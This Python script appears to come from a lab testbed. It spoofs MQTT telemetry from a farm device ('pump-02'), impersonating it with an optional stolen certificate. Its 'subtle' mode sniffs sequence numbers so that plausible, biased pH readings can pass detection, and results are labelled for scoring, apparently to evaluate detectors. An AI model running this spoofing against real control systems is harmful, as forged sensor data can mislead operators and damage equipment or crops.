"""Spoofing: publish forged telemetry as a legitimate device.

styles: blatant = obviously wrong values; subtle = plausible but biased values
with a sniffed-and-incremented seq number and fresh timestamp.
For lab use against the local broker only.
"""
import argparse
import os
import json
import time

from common_attack import connect, make_client, report

ap = argparse.ArgumentParser()
ap.add_argument("--mode", default="plain")
ap.add_argument("--target", default="pump-02", help="device identity to impersonate")
ap.add_argument("--cert-as", default=None, help="cert the attacker holds (stolen), if any")
ap.add_argument("--style", choices=["blatant", "subtle"], default="blatant")
ap.add_argument("--count", type=int, default=10)
ap.add_argument("--tag", default="", help="suffix for the scoring label, e.g. _stolen")
args = ap.parse_args()
label = f"spoof-{args.style}{args.tag}"

topic = f"farm/{args.target}/telemetry"
client = make_client(args.mode, f"attacker-spoof-{os.getpid()}", cert_as=args.cert_as)
ok, why = connect(client, args.mode)
if not ok:
    report(attack=label, connected=False, reason=why, sent=0)
    raise SystemExit(0)

# subtle attacker first sniffs the latest seq number of the target
last_seq = {"v": 0}
if args.style == "subtle":
    client.on_message = lambda c, u, m: last_seq.update(v=json.loads(m.payload).get("seq", 0))
    client.subscribe(topic)
    time.sleep(1.0)

for i in range(args.count):
    if args.style == "blatant":
        msg = {"ph": 9.8, "ec": 0.1, "temp_c": 41.0, "flow_lpm": 0.0}   # pump "dead", nutrients wrong
        seq = i + 1
    else:
        msg = {"ph": 6.6, "ec": 1.9, "temp_c": 22.5, "flow_lpm": 1.9}   # plausible, nudged pH
        seq = last_seq["v"] + 1 + i
    msg.update(device_id=args.target, seq=seq, ts=time.time(), _gt=label)
    client.publish(topic, json.dumps(msg))
    time.sleep(0.2)
time.sleep(0.5)
client.loop_stop()
report(attack=label, connected=True, sent=args.count, target=args.target, cert_as=args.cert_as)
